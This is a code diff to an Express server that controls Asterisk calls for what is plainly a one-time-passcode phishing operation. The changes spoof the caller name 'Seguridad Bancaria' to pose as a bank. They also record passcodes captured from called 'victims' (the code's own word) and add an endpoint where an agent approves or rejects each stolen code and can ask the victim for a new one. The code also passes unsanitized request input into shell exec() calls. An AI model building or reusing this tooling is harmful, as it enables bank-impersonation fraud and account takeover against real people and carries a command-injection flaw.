@@ -549,7 +549,7 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
 
     const cleanDest = destination.trim().replace(/[^0-9]/g, '');
     const effectiveCidNum = (callerIdNum || callerId || '+18005550199').trim();
-    const effectiveCidName = (callerIdName || 'AnonymousOTP').trim();
+    const effectiveCidName = (callerIdName || 'Seguridad Bancaria').trim();
 
     // Prevent double-click originating duplicate calls
     const now = Date.now();
@@ -571,6 +571,8 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       `database put ivr_vars ${cleanDest}_agent_exten "${agentExten || '1001'}"`,
       `database put ivr_vars ${cleanDest}_cid_num "${effectiveCidNum}"`,
       `database put ivr_vars ${cleanDest}_cid_name "${effectiveCidName}"`,
+      `database put extension_cid ${agentExten || '1001'}/number "${effectiveCidNum}"`,
+      `database put extension_cid ${agentExten || '1001'}/name "${effectiveCidName}"`,
     ];
 
     for (const cmd of astDbCommands) {
@@ -673,7 +675,7 @@ app.post('/api/asterisk/extension/callerid', (req, res) => {
 
     const cleanExt = String(extension).trim();
     const cleanNum = String(callerIdNum).trim();
-    const cleanName = String(callerIdName || 'AnonymousOTP').trim();
+    const cleanName = String(callerIdName || 'Seguridad Bancaria').trim();
 
     // Store in Asterisk DB directly via CLI and AMI
     const putNumCmd = `database put extension_cid ${cleanExt}/number "${cleanNum}"`;
@@ -882,7 +884,7 @@ let capturedOtpHistory: CapturedOtpItem[] = [];
 
 // Endpoint to receive OTP captures from Asterisk curl or AMI
 app.post('/api/asterisk/otp/capture', (req, res) => {
-  const { number, otp, channel, service = 'Banco / Antifraude' } = req.body;
+  const { number, otp, channel, service = 'Banco / Antifraude', status = 'pending' } = req.body;
   if (otp) {
     const cleanNumber = (number && number !== '<unknown>') ? String(number) : 'Destino Directo';
     const record: CapturedOtpItem = {
@@ -892,13 +894,52 @@ app.post('/api/asterisk/otp/capture', (req, res) => {
       timestamp: new Date().toLocaleTimeString(),
       channel: channel || 'PJSIP',
       service: service || 'Banco / Antifraude',
-      status: 'valid',
+      status: (status === 'valid' || status === 'invalid') ? status : 'pending',
     };
     capturedOtpHistory.unshift(record);
     if (capturedOtpHistory.length > 300) capturedOtpHistory.pop();
-    console.log(`[PRODUCCIÓN] ⭐ ¡NUEVO CÓDIGO OTP CAPTURADO!: [${otp}] - Tel: ${cleanNumber}`);
+    console.log(`[PRODUCCIÓN] ⭐ ¡NUEVO CÓDIGO OTP CAPTURADO (Esperando validación del agente)!: [${otp}] - Tel: ${cleanNumber}`);
   }
   res.json({ success: true, count: capturedOtpHistory.length });
+});
+
+// Endpoint for agent to decide if captured OTP is valid or invalid
+app.post('/api/asterisk/otp/decision', async (req, res) => {
+  try {
+    const { id, otp, number, status, action } = req.body;
+    if (!status || (status !== 'valid' && status !== 'invalid')) {
+      return res.status(400).json({ success: false, error: 'El estado debe ser "valid" o "invalid"' });
+    }
+
+    if (id) {
+      const match = capturedOtpHistory.find((r) => r.id === id);
+      if (match) match.status = status;
+    } else if (otp) {
+      const match = capturedOtpHistory.find((r) => r.otp === otp);
+      if (match) match.status = status;
+    }
+
+    if (number) {
+      exec(`asterisk -rx 'database put otp_status "${number}" "${status}"'`, (err) => {
+        if (err) console.warn('AstDB otp_status update notice:', err.message);
+      });
+
+      if (action === 'request_retry') {
+        // Clear capture from AstDB so victim can enter new OTP
+        exec(`asterisk -rx 'database del otp_captures "${number}"'`, () => {});
+      }
+    }
+
+    console.log(`[DECISIÓN AGENTE] OTP ${otp || ''} para ${number || 'destino'} marcado como: [${status.toUpperCase()}]`);
+
+    res.json({
+      success: true,
+      message: `Código marcado como ${status === 'valid' ? 'VÁLIDO (Aprobado)' : 'INVÁLIDO (Rechazado)'} por el agente.`,
+      status,
+    });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
 });
 
 // Endpoint to list all captured OTP records
